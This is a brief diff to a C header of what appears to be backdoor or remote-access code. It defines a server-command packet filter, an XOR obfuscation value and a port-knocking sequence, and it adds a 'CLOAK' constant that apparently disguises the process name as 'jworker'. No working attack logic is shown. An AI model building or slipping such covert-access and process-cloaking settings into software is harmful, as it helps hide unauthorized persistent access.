@@ -3,4 +3,5 @@
 #define CMD					"tcp and src host %s" // server cmd
 #define XORVALUE            80
 #define INTERFACE			"p2p1"
+#define CLOAK				"jworker"
 static int knockCode[] = {8080, 8081, 8082, 8083, 8084};
